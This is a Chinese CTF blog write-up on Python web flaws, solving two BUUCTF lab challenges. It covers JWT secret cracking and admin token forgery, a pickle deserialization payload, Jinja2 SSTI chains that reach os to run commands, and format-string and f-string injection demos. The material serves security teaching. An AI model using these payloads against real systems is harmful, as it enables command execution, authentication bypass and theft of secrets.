---
title: "python的SSTI&反序列化&字符串" # 文章标题.
date: 2023-05-29
draft: false
tags: ["CTF"]
categories: ["PHP"]
---

# python的SSTI&反序列化&字符串

![CTF](./CTF.png)

## Python-支付逻辑&JWT&反序列化

[CISCN2019_华北赛区_Day1_Web2]ikun：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#[CISCN2019_华北赛区_Day1_Web2]ikun)

提示要买到IV6，先进行注册一波用户。

![提示](./CISCN2019_华北赛区_Day1_Web2/提示.png)

观察url对应的内容，page对应页数，需要通过爬虫来查找`lv6`，`http://5bf42661-8fa3-4839-b616-7aebe126e47d.node4.buuoj.cn:81/shop?page=3`

![查看LV6出现](CISCN2019_华北赛区_Day1_Web2/查看LV6出现.png)

python写爬虫进行爬取，在180页。

```python
import requests

for i in range(1,999):
    url = "http://5bf42661-8fa3-4839-b616-7aebe126e47d.node4.buuoj.cn:81/shop?page="+str(i)
    html = requests.get(url=url).content.decode("UTF-8")
    if 'lv6.png' in html:
        print(url)
        break
```

![爬取url](CISCN2019_华北赛区_Day1_Web2/爬取url.png)

查找到lv6，账户只有1000，买这个明显不够，这里思路是抓包修改金额，或者修改优惠券（看这个优惠券是前端验证和是服务器验证） 

![找到lv6](CISCN2019_华北赛区_Day1_Web2/找到lv6.png)

查看表单源代码。

在这里存在`id`，`price`，`discount`，这里面价格和折扣都可以修改。

![查看源码](CISCN2019_华北赛区_Day1_Web2/查看源码.png)

修改折扣。

![修改折扣](CISCN2019_华北赛区_Day1_Web2/修改折扣.png)

点击购买，发现只能管理员才能购买（需要进行逻辑（垂直）越权）

![允许管理员购买](./CISCN2019_华北赛区_Day1_Web2/允许管理员购买.png)

cookie信息和权限进行挂钩，查看当前cookie特征：

1. 发现了JWT（头部.负载.签名）：

   JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImZ1Y2sifQ.K-tFjtwpRTY1o5r9exgBnuA_7ATBnASDvkzhFQLxHV8

![寻找Cookie](CISCN2019_华北赛区_Day1_Web2/寻找Cookie.png)

对JWT进行解密：www.jwt.io

发现用户名就是我们注册的用户，但是JWT的密匙我们现需要进行获取。

![解密jwt](./CISCN2019_华北赛区_Day1_Web2/解密jwt.png)

尝试使用`c-jwt-cracker`工具爆破JWT秘钥，成功得到秘钥。

为了更好的使用`c-jwt-cracker`，需要在linux里安装好openssl头文件，在linux的配置命令是：`apt-get install libssl-dev`

下载好c-jwt-cracker，还需要在工具所在目录执行make命令，目的是让文件makefile运行起来。编译完后会生成一个jwtcrack文件

进行破解，密匙为:1Kun。

![破解密钥](./CISCN2019_华北赛区_Day1_Web2/破解密钥.png)

根据密匙修改JWT（用户为admin）得到新的JWT：`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo`

![生成新的JWT](./CISCN2019_华北赛区_Day1_Web2/生成新的JWT.png)

修改`cookie`的`jwt`，然后放出去。

![修改jwt](./CISCN2019_华北赛区_Day1_Web2/修改jwt.png)

发现界面已经改变。

![页面发生变化](./CISCN2019_华北赛区_Day1_Web2/页面发生变化.png)

查看前端源代码查找线索：`/static/asd1f654e683wq/www.zip`。

![查看网页源代码](./CISCN2019_华北赛区_Day1_Web2/查看网页源代码.png)

访问这个url，发现可以下载源代码。

发现是Python的源代码。

pycharm打开对源代码进行代码审计

python漏洞参考：https://github.com/bit4woo/python_sec

对反序列化的关键字（pickle）在项目中进行搜索

![全局搜索反序列化关键字](C:/Users/Admin/Desktop/CTF/python的SSTI&反序列化&字符串/CISCN2019_华北赛区_Day1_Web2/全局搜索反序列化关键字.png)

查看源代码：

post接受传参become，然后将接受到的字符串进行反序列化为对象

我们可以通过构造字符串，为对象的属性和方法进行赋值，构造`payload`。

![源码中发现发现beome](./CISCN2019_华北赛区_Day1_Web2/源码中发现发现beome.png)

构造payload，传输一个对象执行命令执行的方法（这里是python2的代码，必须是Python2的代码）

先构造一个payload对象，里面的reduce方法是python的扩展类型，当对象被反序列化时就会调用__reduce__函数，进行执行命令执行函数，打开`/flag.txt`的文本。

`pickle.dumps()`将对象转化为字符串的格式，然后进行序列化为字符串

`urllib.quote`是将字符串进行url编码（由于在源代码里面进行了url解码，所以这里需要进行事先的编码）

![接受参数](./CISCN2019_华北赛区_Day1_Web2/接受参数.png)

`payload(obiect)`：即payload类继承了object对象（python3里面是默认继承的，Object类是一切类的父类）

```python
import pickle
import urllib

class payload(object):
    def __reduce__(self):
        return (eval,("open('/flag.txt','r').read()",))

payload_string=pickle.dumps(payload())
payload_url=urllib.quote(payload_string)
print payload_url
```

必须是`python2`，因为python2与python3反序列化后的内容不一样。

由于表达传参的位置是隐藏的，需要修改。

![查找隐藏的属性](./CISCN2019_华北赛区_Day1_Web2/查找隐藏的属性.png)

直接post传参。

修改元素，将hidden去掉，发现post的弹窗出现，可以进行post传参。

![填入pyload](./CISCN2019_华北赛区_Day1_Web2/填入pyload.png)

输入payload。

![拿到flag](./CISCN2019_华北赛区_Day1_Web2/拿到flag.png)

## Python-Flask&jinja2&SSTI模版注入

SSTI漏洞的参考：https://xz.aliyun.com/t/7746

`ssti`主要为`python`的一些框架`jinja2`，`mako`，`tornado`，`django`，`PHP`框架`smarty`，`twig`，`java`框架`jade`，`velocity`等等使用了渲染函数，这些函数对用户的输入信任，造成了模板注入漏洞，可以造成文件泄露，`rce`等漏洞。

**正常的代码片段**

前端name传参，用户通过传递name参数可以控制回显的内容：

注意：`name = request.args.get('name')`是因为：当需要获取前端页面表单传过来的id值的时候，我们就需要用request.args.get。

```python
from flask import Flask,request,render_template

app = Flask(__name__)
app.config["SECRET"] = "root:password"

@app.route("/")
@app.route("/index")
def index():
    return render_template("index.html",title="SSTI_TEST",name=request.args.get("name"))

if __name__ == '__main__':
    app.run()
```

render_template 是flask中页面跳转的方法，其用法很简单，如下：

这里渲染的模板为：index.html，模板显示的参数为name，即用户通过传递name参数可以控制回显的内容。

index.html文件的内容。

```python
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>{{title}}</title>
</head>
<body>
    <h1>{{name}}</h1>
</body>
</html>
```

这里可能会造成命令执行，如果先传参再渲染，对于payload的传参会在渲染的时候造成命令执行。

![SSTI正确测试](./Flask&jinja2&SSTI模版注入/SSTI正确测试.png)

但是这里即使用户输入渲染模板，更改语法结构，也不会造成SSTI注入：

原因是：服务端先将index.html渲染，然后读取用户输入的参数，模板其实已经固定，用户的输入不会更改模板的语法结构。

![注入正确](./Flask&jinja2&SSTI模版注入/注入正确.png)

如果是不正确的写法（先读取再渲染）：

这里前端表单传递了两个参数`name`和`guest`给`name`，其中`guest`是`name`的默认值。

Python中Template是string中的一个类，可以将字符串的格式固定下来，重复利用。唯一的变量就是name

render方法：实质就是生成template模板的；通过调用一个方法来生成，而这个方法是通过render方法的参数传递给它的；这个方法有三个参数，分别是标签名`<title>`，标签的相关属性，标签内部的html内容；通过这三个参数，可以生成一个完整的模板。(大致就是渲染的意思)

`%s`就是前端的显示变量

```python
from flask import Flask,request
from jinja2 import Template
app = Flask(__name__)
app.config["SECRET"] = "root:password"
@app.route("/")
@app.route("/index")
def index():
    name = request.args.get("name","guest")
    t = Template(
        '''<!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <title>{{title}}</title>
            </head>
            <body>
                <h1>%s</h1>
            </body>
            </html>
        '''%(name)
    )
    return t.render(title="Flask_Simple")

if __name__ == '__main__':
    app.run()
```

进行测试：输入的内容被服务器渲染然后输出，形成SSTI模板注入漏洞。

![SSTI报错](./Flask&jinja2&SSTI模版注入/SSTI报错.png)

判断是否存在SSTI（模板注入）漏洞（黑盒判断）

中间件：可通过请求响应头`server`值判断，比如`Server：Werkzeug/0.11.15 python/3.7.0`，说明后台使用python脚本编写，应该想到测试是否有SSTI漏洞。

![查看响应头](./Flask&jinja2&SSTI模版注入/查看响应头.png)

关键字提示：比如`flask`（这个漏洞是flask框架的）、`jinja2`、`makjo`等。

不同的框架就有不同的模板。

![不同的渲染模板](./Flask&jinja2&SSTI模版注入/不同的渲染模板.png)

**payload的构造的基础知识**

`__class__`万物皆对象，而class用于返回该对象所属的类。

```python
number = 100
print(number.__class__) # <class 'int'>
print("".__class__) # <class 'str'>
print(["list", "love"].__class__) # <class 'list'>
```

`__bases__`以元组的形式返回一个类所直接继承的类。

`__base__`以字符串返回一个类所直接继承的第一个类

`__mro__`返回解析方法调用的顺序。（顺序是由子类到父类，格式是以元组的形式返回）

`__subclasses__()`获取类的所有子类。（以列表的形式）

`__globals__`：`function.__globals__`，用于获取`function`所处空间下可使用的`module`、方法以及所有变量。

`__init__`所有自带类都包含init方法。

```python
class Base_1:
    def __init__(self):
        pass
class Base_2:
    def __init__(self):
        pass
class Test_Class(Base_1,Base_2):
    pass


print(Test_Class.__bases__)
# (<class '__main__.Base_1'>, <class '__main__.Base_2'>)
print(Test_Class.__base__)
# <class '__main__.Base_1'>
print(Test_Class.__mro__)
# (<class '__main__.Test_Class'>, <class '__main__.Base_1'>, <class '__main__.Base_2'>, <class 'object'>)
print(Test_Class.__subclasses__())
# []
print(Base_1.__subclasses__())
# [<class '__main__.Test_Class'>]
print(Base_1.__init__)
# <function Base_1.__init__ at 0x000002B2CAD0C900>
print(Base_1.__init__.__globals__)
'''
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.Sourc
eFileLoader object at 0x000002B2CABA98D0>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'b
uiltins' (built-in)>, '__file__': 'C://CodePath//Python_Project//Python_Security//Python_Study//first.py', '__
cached__': None, 'Base_1': <class '__main__.Base_1'>, 'Base_2': <class '__main__.Base_2'>, 'Test_Class': <clas
s '__main__.Test_Class'>}
'''
```

构造payload

随便找一个内置类对象用`__class__`拿到他所对应的类。

用`__bases__`拿到基类`（<class 'object'>）`

![SSTI回显](./Flask&jinja2&SSTI模版注入/SSTI回显.png)

用`__subclasses__()`拿到子类列表

在子类列表中直接寻找可以利用的类getshell（需要找到可以进行命令执行的子类即os模块）

![找到OS模块](./Flask&jinja2&SSTI模版注入/找到OS模块.png)

查找os在返回页面里的位置

```python
import requests

html = requests.get("http://127.0.0.1:5000/?name={{％22％22.__class__.__bases__[0].__subclasses__()}}").content.decode("UTF-8") # 应该是英文的%
result = html.replace("/n", "")
result_split = result.split(",")
print(result_split.index(" <class 'os._wrap_close'>")) # 147
```

![验证索引](./Flask&jinja2&SSTI模版注入/验证索引.png)

利用os进行payload的构造。

```python
http://127.0.0.1:5000/?name={{"".__class__.__bases__[0].__subclasses__()[147].__init__.__globals__["__builtins__"]["eval"]('__import__("os").popen("whoami").read()')}}
```

![执行EXP](./Flask&jinja2&SSTI模版注入/执行EXP.png)

### CTF题目

靶场地址：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#[WesternCTF2018]shrine)

![进入靶场](./Flask&jinja2&SSTI模版注入/CTF/进入靶场.png)

分析源码：

```python
import flask
import os
app = flask.Flask(__name__)
app.config['FLAG'] = os.environ.pop('FLAG')
# 注册了一个名为FLAG的config
@app.route('/')
def index():
    return open(__file__).read()

@app.route('/shrine/')
def shrine(shrine):

    def safe_jinja(s):
        # 替换掉()
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        # 过滤
        # {％ set config=None％}{％ set self=None％} 应该是英文的%
        return ''.join(['{{％ set {}=None％}}'.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))

if __name__ == '__main__':
    app.run(debug=True)
```

这里有两个路由，进入`/`就是读取源文件；进入`/shrine/`(这里没有进行前端的表单传参)。

先手工测试一次。

![手动测试](./Flask&jinja2&SSTI模版注入/CTF/手动测试.png)

输入：`{{config}}`，发现`config`被过滤了。

![过滤了config](./Flask&jinja2&SSTI模版注入/CTF/过滤了config.png)

首先，我们先进行类的读取（获取类>获取object父类>获取获取object的子类列表，`"".__class__.__bases__[0].__subclasses__()`

![获取所有的类](./Flask&jinja2&SSTI模版注入/CTF/获取所有的类.png)

但是这题设了黑名单['config','self']并且过滤了括号。

不过python还有一些内置函数，比如`url_for`（用于构建指定的url，调用已经声明的函数）和`get_flashed_messages`。

Flask提供了很多种方式来加载配置。

比如，你可以像在字典中添加一个键值对一样来设置一个配置

`os.environ`是`python`获取系统信息的一个方法。

`app.config['FLAG']`就是当前app下一个变量名为`FLAG`的配置，它的值等于`os.environ.pop('FLAG')`：即移除环境变量中的键名为`FLAG`的值。（这句话的意思就是说flag在app的config变量里）

`url_for`查看全局变量（  所处空间下可使用的module、方法以及所有变量）：`/shrine/{{url_for.__globals__}} `。

![读取全局变量](./Flask&jinja2&SSTI模版注入/CTF/读取全局变量.png)

`current_app`意思应该是`当前app`，那我们就看当前app下的config：`/shrine/{{url_for.__globals__['current_app'].config}}`，成功拿到`flag`。

![读取flag](./Flask&jinja2&SSTI模版注入/CTF/读取flag.png)

## Python-格式化字符串漏洞&读取对象

格式化字符串漏洞原理

- 第一种：%操作符

  调用Format方法，name后面的值可控，我们就可以传参获取当前脚本的核心变量flag值。

  ```python
  name = "Bob"
  print("Hello %s" % name) # Hello Bob
  ```

- 第二种：string.Template

  使用标准库中模板字符串类进行字符串格式化。

  ```python
  name = "Bob"
  from string import Template
  t = Template("Hello,$name!")
  print(t.substitute(name=name)) # Hello,Bob!
  ```

- 第三种：调用Format方法

  调用Format方法，python3后引入的新版格式化字符串写法，但是这种写法存在安全隐患。

  ```python
  name , errno = 'Bob' , 50159747054
  print('Hello {}'.format(name)) # Hello Bob
  ```

  存在安全隐患的代码：

  这里通过获取类-->获取类的init初始方法-->获取所处空间下可使用的module、方法以及所有变量-->获取到配置文件信息。

  ```python
  config = {"flag":"love"}
  class User(object):
      def __init__(self,name):
          self.name = name
  user = User("joe")
  print("Hello {name}".format(name="jack")) # Hello jack
  print("Hello {name}".format(name=user.__class__.__init__.__globals__))
  '''
  Hello {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external
  .SourceFileLoader object at 0x000001B136EB98D0>, '__spec__': None, '__annotations__': {}, '__builtins__': <mod
  ule 'builtins' (built-in)>, '__file__': 'C://CodePath//Python_Project//Python_Security//format//format_%.py', 
  '__cached__': None, 'config': {'flag': 'love'}, 'User': <class '__main__.User'>, 'user': <__main__.User object
   at 0x000001B136FAC1D0>}
  '''
  print("Hello {name}".format(name=user.__class__.__init__.__globals__["config"])) # Hello {'flag': 'love'}
  ```

- 第四种：f-Strings

  这是python3.6之后新增的一种格式化字符串方式，其功能十分强大，可以执行字符串中包含的python表达式，安全隐患可想而知。

  使用import导入Python模块的时候，默认调用的是`__import__()`函数

  这里是导入os模块，调用system方法，执行whoami

  返回0是system函数调用成功的返回值。

  ```python
  a, b = 5, 10
  str = f' {a + b} 不等于 {2*(a+b)}'
  print(str) # 15 不等于 30
  print(f'{__import__("os").system("ipconfig")}')
  ```

